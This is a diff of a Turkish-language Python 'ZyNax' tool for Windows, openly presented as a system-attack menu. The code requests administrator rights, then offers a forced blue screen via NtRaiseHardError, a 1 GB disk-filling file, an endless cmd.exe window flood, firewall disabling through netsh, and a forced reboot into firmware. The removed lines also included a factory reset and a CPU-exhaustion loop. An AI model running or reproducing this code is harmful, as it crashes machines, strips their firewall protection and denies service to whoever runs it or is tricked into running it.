@@ -4,9 +4,7 @@ import time
 import ctypes
 import threading
 import json
-import random
 import platform
-import subprocess
 from urllib.request import urlopen
 
 # --- RENK PALETİ ---
@@ -16,125 +14,84 @@ os.system("")
 def temizle():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-# --- 5 SANİYELİK KRİTİK GİRİŞ ---
+def admin_olarak_baslat():
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        return True
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        return False
+
 def giris_ekrani():
     temizle()
-    print(f"\n\n\t\t{R}╔══════════════════════════════════════════════╗")
-    print(f"\t\t║          !!! ZYnaX SİBER GÜVENLİK !!!        ║")
+    print(f"{R} [!] SISTEME SIZILIYOR...{RES}")
+    loglar = ["[*] Kernel yukleniyor...", "[*] ZyNax v190 baglandi.", "[*] Yusuf yetkisi onaylandi."]
+    for log in loglar:
+        print(f"{G} {log}{RES}")
+        time.sleep(0.3)
+
+    print(f"\n\t\t{R}╔══════════════════════════════════════════════╗")
+    print(f"\t\t║          !!! ZYNAX SIBER GUVENLIK !!!        ║")
+    print(f"\t\t║               YAPIMCI: YUSUF                 ║")
     print(f"\t\t╚══════════════════════════════════════════════╝{RES}")
-    print(f"\n\t\t{Y}DİKKAT: Hiçbir kullanıcı dosyası SİLİNMEYECEKTİR.")
-    print(f"\t\tSistem kararlılığı için testler başlatılıyor.{RES}")
-    print(f"\t\t{C}Yapımcı ZyNax(Yusuf)...{RES}")
-    for i in range(5, 0, -1):
-        print(f"\t\t[ SİSTEMİN AÇILMASINA: {i} SANİYE ]", end="\r")
+    print(f"\n\t\t{Y}⚠️  DIKKAT: TUM SORUMLULUK KULLANICIYA AITTIR.{RES}")
+    for i in range(3, 0, -1):
+        print(f"\t\t[ ACILMASINA: {i} SANIYE ]", end="\r")
         time.sleep(1)
-    print("\n\n\t\t[+] ERİŞİM ONAYLANDI! KERNEL AKTİF.")
-    time.sleep(1)
 
-# --- [02] DİSK BOMBACISI (GELİŞMİŞ MODÜL) ---
-def disk_bombasi():
-    temizle()
-    print(f"{R}—"*65 + f"\n\t[!!!] ÖZEL DİSK BOMBARDIMANI (MB/GB) [!!!]\n" + "—"*65 + f"{RES}")
-    try:
-        yol_input = input(f"\n{C}[?] Hedef Klasör Yolu ('m' = Masaüstü): {RES}").strip()
-        if yol_input.lower() == 'm':
-            yol = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'zynax_payload.dat')
-        else:
-            yol = os.path.join(yol_input, 'zynax_payload.dat') if os.path.isdir(yol_input) else yol_input
-        
-        birim = input(f"{Y}[?] Boyut birimi (mb / gb): {RES}").lower()
-        miktar = int(input(f"{Y}[?] Miktar girin: {RES}"))
-        
-        boyut = miktar * 1024 * 1024 if birim == "mb" else miktar * 1024 * 1024 * 1024
+def sonsuz_pencere():
+    print(f"{R}[!!!] SINIRSIZ MOD AKTIF!{RES}")
+    while True:
+        os.system("start cmd.exe")
 
-        print(f"\n{B}[*] Hedef Belirlendi: {yol}")
-        print(f"[*] İşlem Başlıyor... Lütfen bekleyin.{RES}")
-
-        with open(yol, "wb") as f:
-            f.seek(boyut - 1)
-            f.write(b"\0")
-        
-        for i in range(1, 11):
-            print(f"{R}[!] YAZILIYOR: %{i*10}{RES}", end="\r")
-            time.sleep(0.1)
-        print(f"\n\n{G}[+] BAŞARILI! {miktar} {birim.upper()} dosya oluşturuldu.{RES}")
-    except Exception as e: print(f"{R}[X] Hata: {e}{RES}")
-    input(f"\n{W}Ana menüye dönmek için ENTER...{RES}")
-
-# --- ANA MENÜ (11/11 TAM LİSTE) ---
 def ana_menu():
     temizle()
-    # Gökkuşağı Logo
-    print(f"{R}  ________" + f"{G}                    _____" + f"{Y}    ____" + f"{B}  ___")
-    print(f"{R}  \_____  \\" + f"{G}  ___.__." + f"{Y}  ____" + f"{B}    /  _  \\" + f"{C}    \    \\" + f"{W}/  /")
-    print(f"{R}   /   |   \\" + f"{G}<   |  |" + f"{Y} /    \\" + f"{B}  /  /_\  \\" + f"{C}    \      /")
-    print(f"{R}  /    |    \\" + f"{G} \___  |" + f"{Y}|    |" + f"{B}  \/    |    \\" + f"{C}    /      \\")
-    print(f"{R}  \_______  /" + f"{G} / ____|" + f"{Y}|___|" + f"{B}  /\____|__  /" + f"{C}    /___/\  \\")
-    print(f"{R}          \/" + f"{G}  \/      " + f"{Y}    \/" + f"{B}          \/" + f"{C}           \_/")
+    # GENIS VE 3D GORUMLU ZYNAX LOGOSU
+    print(f"""{R}
+ ███████╗██╗   ██╗███╗   ██╗ █████╗ ██╗  ██╗
+ ╚══███╔╝╚██╗ ██╔╝████╗  ██║██╔══██╗╚██╗██╔╝
+   ███╔╝  ╚████╔╝ ██╔██╗ ██║███████║ ╚███╔╝ 
+  ███╔╝    ╚██╔╝  ██║╚██╗██║██╔══██║ ██╔██╗ 
+ ███████╗   ██║   ██║ ╚████║██║  ██║██╔╝ ██╗
+ ╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ v190
+    {RES}""")
     
-    print(f"\n\t{R}[!]{G} ZYnaX{Y} v190{B} |{C} 11/11{W} MEGA SÜRÜM{RES}")
-    print(f"{C}—"*75 + f"{RES}")
-    print(f" [01] {Y}IP / SİSTEM ANALİZİ{RES}         [07] {R}SONSUZ PENCERE BOMBASI{RES}")
-    print(f" [02] {Y}DİSK BOMBACISI (MB/GB){RES}      [08] {R}GÜVENLİK DUVARI KAPAT{RES}")
-    print(f" [03] {R}MAVİ EKRAN (BSOD){RES}            [09] {R}SİSTEMİ KİLİTLE (PARALYZE){RES}")
-    print(f" [04] {R}SİSTEMİ SIFIRLA (HARD){RES}       [10] {R}SONSUZ REBOOT DÖNGÜSÜ{RES}")
-    print(f" [05] {B}YENİDEN BAŞLATMA{RES}             [11] {C}PROGRAMDAN GÜVENLİ ÇIKIŞ{RES}")
-    print(f" [06] {C}BIOS AYARLARINA ZORLA{RES}        {W}-------------------------{RES}")
-    print(f"{C}—"*75 + f"{RES}")
+    print(f"\t{R}[!]{G} ZyNax{Y} v190{B} |{C} Yapimci: {W}Yusuf{RES}")
+    print(f"{C}—"*65 + f"{RES}")
+    print(f" [01] {Y}🔍 IP ANALIZ{RES}          [07] {R}🖼️  SINIRSIZ PENCERE{RES}")
+    print(f" [02] {Y}💣 DISK BOMBASI{RES}        [08] {R}🛡️  FIREWALL KAPAT{RES}")
+    print(f" [03] {R}💻 MAVI EKRAN{RES}          [09] {R}🔒 SISTEM KILIT{RES}")
+    print(f" [04] {R}⚠️  HARD RESET{RES}          [10] {R}🔄 REBOOT DONGUSU{RES}")
+    print(f" [05] {B}⚡ RESTART{RES}             [11] {C}🚪 GUVENLI CIKIS{RES}")
+    print(f" [06] {C}⚙️  BIOS ZORLA{RES}          {W}-------------------------{RES}")
+    print(f"{C}—"*65 + f"{RES}")
 
-    secim = input(f"\n {B}ZYnAx_DADAS > {RES}")
+    secim = input(f"\n {B}ZyNax_YUSUF > {RES}")
 
     if secim == "1":
-        temizle()
-        print(f"{C}[*] Cihaz Verileri Çekiliyor...{RES}")
         try:
             d = json.loads(urlopen("http://ip-api.com/json/").read().decode())
-            print(f"\n{G}Sistem: {platform.system()} {platform.release()}")
-            print(f"IP: {d.get('query')} | Ülke: {d.get('country')}{RES}")
+            print(f"\n{G}IP: {d.get('query')} | Sehir: {d.get('city')}{RES}")
         except: pass
-        input("\nDevam etmek için ENTER..."); ana_menu()
-    
-    elif secim == "2": disk_bombasi(); ana_menu()
-    
+        input("\nENTER..."); ana_menu()
+    elif secim == "2":
+        temizle()
+        yol = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'zynax.dat')
+        with open(yol, "wb") as f:
+            f.seek(1024*1024*1024 - 1) # 1GB default
+            f.write(b"\0")
+        print(f"{G}1GB Dosya Masaustune Olusturuldu.{RES}"); input(); ana_menu()
     elif secim == "3":
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
-    
-    elif secim == "4":
-        if input(f"{R}EMİN MİSİN? (e/h): {RES}").lower() == 'e': os.system("systemreset -factoryreset")
-        else: ana_menu()
-    
-    elif secim == "5": os.system("shutdown /r /t 0")
-    
     elif secim == "6": os.system("shutdown /r /fw /t 0")
-    
-    elif secim == "7":
-        print(f"{R}[!] Pencereler patlıyor...{RES}")
-        for _ in range(20): os.system("start cmd.exe")
-        ana_menu()
-    
-    elif secim == "8":
-        os.system("netsh advfirewall set allprofiles state off")
-        print(f"{G}[+] Güvenlik duvarı devre dışı.{RES}"); time.sleep(2); ana_menu()
-    
-    elif secim == "9":
-        print(f"{R}[!] İşlemci yükü arttırılıyor...{RES}")
-        def kilit():
-            while True: pass
-        for _ in range(50): threading.Thread(target=kilit, daemon=True).start()
-        time.sleep(3); ana_menu()
-    
-    elif secim == "10": os.system("shutdown /r /t 0")
-    
+    elif secim == "7": sonsuz_pencere()
+    elif secim == "8": os.system("netsh advfirewall set allprofiles state off"); ana_menu()
     elif secim == "11": sys.exit()
-    
     else: ana_menu()
 
 if __name__ == "__main__":
-    # Yönetici İzni Kontrolü
-    if not ctypes.windll.shell32.IsUserAnAdmin():
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ", None, 1)
+    if admin_olarak_baslat():
+        giris_ekrani()
+        ana_menu()
+    else:
         sys.exit()
-    
-    giris_ekrani()
-    ana_menu()
